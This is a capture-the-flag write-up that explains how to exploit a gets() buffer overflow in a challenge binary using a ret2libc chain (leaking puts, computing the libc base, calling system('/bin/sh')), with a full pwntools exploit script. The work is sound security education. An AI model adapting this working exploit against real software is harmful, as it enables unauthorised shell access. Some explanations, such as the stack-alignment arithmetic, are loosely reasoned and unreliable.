# Favourite Shell

## File Analysis

![image](https://github.com/user-attachments/assets/e00de133-9a97-4b16-b9eb-a5f29d53ccfc)

## Steps to Solve
## Step 1

![image](https://github.com/user-attachments/assets/db41d024-0eb7-4df9-b872-690c0b40e6fc)

First of all, we try to run this file and see it only prompt us to input "What's your favourite shell" then whenever we enter anything it will just print out "oh that one? me too!". It seems like nothing special here, so I tried to decompile it using **Ghidra**.

<details>
<summary>Decompile Main Code</summary>

```C
{
  char buffer [32];
  
  setup();
  puts("whats your favourite shell?");
  gets(buffer);
  puts("oh that one? me too!");
  return 0;
}
```

</details>

From Ghidra, that's also nothing much more interesting. There is only a main function in the decompile code. One thing we can notify is that we can perform **Buffer Overflow** for this because **gets** didn't specify how many sise can be input into the buffer. Therefore, we can perform **Buffer Overflow**.

## Step 2

![image](https://github.com/user-attachments/assets/af053688-d14c-4a0e-b87a-76618707e072)

After knowing that we can perform buffer overflow. Then I tried to **ret2system** because that I can't inject shellcode because of **NX enabled** and also no **win function** for me to return to. Therefore, I have to find a **libc leak** now. To do that, I will first find a **pop rdi** gadget using **ROPgadget**. In this case, I'll take the _**0x000000000040118d : pop rdi ; ret**_.

> The reason to have a **pop rdi** is because that the **puts()** function is actually taking a parameter from **rdi**. Therefore, now I'm going to pop the **puts address** into the rdi and call the **puts()** function again. Now it will print out the address of the puts address.

## Step 3

```python
offset = 0x28

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym.main)

p.sendline(payload)

p.recvline()
p.recvline()

puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))

print("PUTS LEAK : ", hex(puts_leak))
```

![image](https://github.com/user-attachments/assets/9d8f5eda-d17a-419f-9c35-7fd3164fdf88)

Then when I have the **pop rdi** gadget, I now **pop the address of 'puts' into 'rdi' then call the puts() function again**. After that I'll call the main function again. Just like this, we can already see the **libc leak** which is the **'puts' address**.

> **"GOT (Global Offset Table)"** is a **place** where will store the function's address after calling the function. So **exe.got['puts']** means, **getting the address** of puts function.
> 
> **"PLT (Procedure Linkage Table)"** is **to call** the function inside the **GOT**. So **exe.plt['puts']** means, **calling the function puts**.
> 
> Therefore, when we have **'puts'** function already inside the **GOT**, then we can use **PLT** to call the **'puts'** function.

## Step 4

So when we already have the **libc leak**, we can already find out the **libc base address**. The reason to do this is because we need to use the **libc symbols** like **system** and **search**. To find the **libc base address**, we can count it by subtracting the offset of puts with the **libc.sym['puts']**.

```python
libc.address = puts_leak - libc.sym['puts']

print("LIBC BASE : ", hex(libc.address))
```

> The **libc.address** is let us to setting up the libc base address. So that we can use all the libc symbols later. One of the most important things that why we need to have the libc base address is because of **"ASLR (Address Space Layout Randomization)"**. When the ASLR is on, the **base address** of key memory areas e.g.(**libc, stack and heap**) are always randomized. Therefore, if we want to use the libc symbols, we have to find the libc base address first when ASLR is on.
>
> To check if ASLR is on or off we can run the following commands:
> ```bash
> sysctl kernel.randomize_va_space
> ```
>
> or
>
> ```bash
> cat /proc/sys/kernel/randomize_va_space
> ```
>
> Output:
>  - 0 means ASLR is off (disabled).
>  - 1 means ASLR is partially on (only for stack, heap, and mmap).
>  - 2 means ASLR is fully on (randomizes stack, heap, mmap, and executable code).
> 

## Step 5

After setting up the libc base address, then I can also find for the **system()** function address and also search for the **/bin/sh\x00** address. Therefore, I can use this to spawn a shell.

```python
system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh\x00"))
```

> next() function is used to retrieve the first occurrence address of /bin/sh\x00. Because it might find many addresses, therefore have to use the next() function

## Step 6

After we having all the addresses, then we can start our second stage exploit by sending the **system('/bin/sh')** to the binary. Finally, we spawn a shell!!

```python
payload = b"A" * offset
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
```

> The reason to include the **"p64(pop_rdi + 1)"**(which is a **ret** instruction) is because of the **stack alignment**. Each p64() is actually **8 bytes**, then in this case there are 8 * p64(), which will be 8 * 8 = 64 bytes. Then also it matches the stack alignment by 16 bytes, because 64 % 16 = 0.
>
> _GENERATED BY CHATGPT:_ "In many cases, especially on x86_64 (64-bit) systems, the stack must be aligned to a 16-byte boundary before calling a function like system() or other libc functions. This is a requirement of the x86_64 ABI (Application Binary Interface)." 

## Step 7 (Additional Step Required for Remote Server)

So after that I done and spawn a shell in local, and I tried to connect it remotely but it still cannot spawn a shell on it. Then I remembered that I encountered this issues before, which is because of the remote server's libc is different with my local host. Therefore, I need to download the libc file that same with the remote server. Luckily, this challenge has already provided the Dockerfile, therefore I can just copy the Docker Container's libc and copy to my localhost. To do this, I have to first build the docker with the following command.

```bash
sudo docker build -t <tagname> . # Any tagname should be fine
sudo docker run -v "`pwd`:/chal" -it <HASH> bash # Replace the hash with user@hash, can be see from the image provided below. The value after the "Digest:" is the hash.
```

Example:
**PLACEHOLDER**

After that just cd (change directory) into the **/chal** directory, then use command **ldd <binary>** to see which libc is being used.

```bash
ldd <binary>
```

Example:
**PLACEHOLDER**

From here, we can tell that the chal is running with **libc.so.6**. Then we can just copy the libc to our localhost by using the following command:

```bash
cp /lib/x86_64-linux-gnu/<LIBC> . # Use . when you are in the same directory
```

Example:
**PLACEHOLDER**

So now we can see that the libc is already in our localhost's directory, then we have to **patch the binary** using the **new libc** that taken from the docker. We can do this by using the command [pwninit](https://github.com/io12/pwninit). But before that, let use see the default libc and after the new libc using **ldd**.

**_BEFORE_**
**PLACEHOLDER**

**_AFTER (pwninit)_**
**PLACEHOLDER**

## FINALLL !!!

So after everything is done, now we can just run the full exploit script, and we can spawn a shell !!

<details>
  <summary>Exploit Script</summary>

  ```python
from pwn import *

exe = context.binary = ELF('./chal_patched')
libc = ELF('./libc.so.6')

pop_rdi = 0x000000000040118d

p = exe.process()

offset = 0x28

payload = b"A" * offset
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym.main)

p.sendline(payload)

p.recvline()
p.recvline()

puts_leak = u64(p.recvline().strip().ljust(8, b"\x00"))

print("PUTS LEAK : ", hex(puts_leak))

libc.address = puts_leak - libc.sym['puts']

print("LIBC BASE : ", hex(libc.address))

system = libc.sym['system']
binsh = next(libc.search(b"/bin/sh\x00"))

payload = b"A" * offset
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)

p.interactive()
```

</details>

Just like that and we spawn a shell !!

